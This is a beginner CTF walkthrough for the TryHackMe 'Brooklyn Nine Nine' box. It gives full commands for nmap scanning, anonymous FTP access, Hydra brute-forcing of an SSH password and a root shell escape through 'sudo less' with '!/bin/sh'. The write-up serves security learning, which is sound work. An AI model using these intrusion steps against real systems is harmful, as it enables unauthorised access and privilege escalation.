# **Brooklyn Nine Nine CTF**
Brooklyn Nine Nine is a simple CTF on TryHackMe aimed at beginner level hackers with multiple methods of completion. 

**Step 1: VPN** \
Because I am using my own instance of Kali I have to begin by connecting to TryHackMe's network using OpenVPN and the .ovpn file I downloaded from TryHackMe.
```
sudo openvpn <tryhackme.ovpn>
```
**Step 2: Nmap** \
I run a scan with nmap to discover open ports and their associated services. 
```
nmap -sC -sV <ip_address>
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(1).png) \
There is a lot of valuable information in these results. The target is running FTP, SSH, and HTTP, so we know that it is both a file and web server that can be accessed remotely. The first thing that pops out to me is that Anonymous FTP login is allowed and there exists a note addressed to Jake so lets start with that. 

**Step 3: FTP** \
I connect to the target with ftp, using **anonymous** as the username and leaving the password blank.
```
ftp <ip_address>
get note_to_jake.txt
exit
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(2).png) \
Lets read the note.
```
cat note_to_jake.txt
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(3).png) \
The note tells us that Jake has a weak password, which is something we can take advantage of. 

**Step 4: Brute-Force w/ Hydra** \
Assuming that jake is Jake's username, we can use hydra and a wordlist to discover his password. 
```
hydra -l jake -P /usr/share/wordlists/rockyou.txt <ip_address> ssh
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(12).png) \
Looks like we got his password, Holt will in fact be mad.

**Step 5: SSH** \
Now that we have Jake's username and password, we can log in to the target machine via SSH. 
```
ssh jake@<ip_address>
```
Enter "yes" when asked if you are sure you want to continue connecting and then enter Jake's password. 
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(5).png) \
We are in. 

**Step 6: Finding the User Flag** \
With user access we should be able to find the user flag. After looking in each user's home directory we found user.txt in /home/holt.
```
cd /home/holt
ls -lah
cat user.txt
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(13).png) \
Got the first flag!

**Step 7: Privilege Escalation** \
Now that we have the user flag, we need to find a method to escalate our privileges to access the root flag. Lets start by running sudo -l to see if Jake is capable of running any commands with sudo. 
```
sudo -l
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(7).png) \
We can see here that Jake is capable of running the "less" command with sudo without needing a password. 

[GTFOBins](https://gtfobins.org/gtfobins/less/#shell) tells us that we can spawn an interactive shell with root privileges if we can execute less with sudo.
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(8).png) 
```
sudo less /etc/hosts
```
From here, we can simply enter the second command provided to us by GTFOBins.
```
!/bin/sh
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(9).png) \
Now we have an interactive shell as root, which we can verify by running the "whoami" command. 
```
whoami
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(10).png) 

**Step 8: Finding the Root Flag** \
Now that we are root, we can find the root flag. Checking in the /root directory I discovered root.txt.
```
cd /root
ls -lah
cat root.txt
```
![screenshot](https://github.com/nicholasingle/ctf-writeups/blob/main/images/Screenshot%20(14).png) \
Got the root flag!

## Conclusion
This CTF is an excellent introduction into the world of Hacking, combining FTP, SSH brute-forcing, and Privilege Escalation via the less command. \ 
This was only one method of breaking into this box, I encourage you to work your way through the second method by visiting the website hosted by the target. 
